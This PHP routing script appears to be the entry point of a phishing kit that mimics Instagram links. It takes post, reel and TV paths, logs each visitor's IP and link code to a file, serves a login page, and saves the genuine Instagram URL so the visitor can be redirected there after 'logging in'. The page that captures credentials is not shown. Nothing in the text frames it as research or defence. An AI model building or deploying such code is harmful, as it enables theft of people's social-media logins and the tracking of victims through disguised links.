<?php

// Load environment variables
if (file_exists(__DIR__ . '/.env')) {
    $lines = file(__DIR__ . '/.env', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        if (strpos(trim($line), '#') === 0) continue;
        if (strpos($line, '=') === false) continue;
        list($key, $value) = explode('=', $line, 2);
        $_ENV[trim($key)] = trim($value);
        putenv(trim($key) . '=' . trim($value));
    }
}

// Get the request URI
$request_uri = $_SERVER['REQUEST_URI'];
$path = parse_url($request_uri, PHP_URL_PATH);

// Route handling
if ($path === '/' || $path === '/index.php') {
    header('Location: login.html');
    exit;
}

// Handle Instagram-like URLs: /p/xxx, /reel/xxx, /tv/xxx
if (preg_match('#^/(p|reel|tv)/([a-zA-Z0-9_-]+)/?$#', $path, $matches)) {
    $type = $matches[1];
    $code = $matches[2];
    
    // Get original URL from mappings
    $original_url = getOriginalUrl($code);
    
    // Store in session for redirect after login
    session_start();
    $_SESSION['redirect_url'] = $original_url ?: 'https://www.instagram.com/';
    $_SESSION['link_code'] = $code;
    
    // Log the click
    $log_file = __DIR__ . "/clicks_log.txt";
    $ip = $_SERVER['REMOTE_ADDR'];
    $timestamp = date("Y-m-d H:i:s");
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    
    $log_entry = "[{$timestamp}] Type: {$type} | Code: {$code} | IP: {$ip} | Redirect: {$original_url}\n";
    file_put_contents($log_file, $log_entry, FILE_APPEND);
    
    // Show login page
    include __DIR__ . '/login.php';
    exit;
}

// Default: show login page
header('Location: login.html');
exit;

function getOriginalUrl($code) {
    $mappings_file = __DIR__ . '/url_mappings.json';
    
    if (file_exists($mappings_file)) {
        $mappings = json_decode(file_get_contents($mappings_file), true) ?: [];
        if (isset($mappings[$code])) {
            return $mappings[$code]['original_url'];
        }
    }
    
    return null;
}

?>

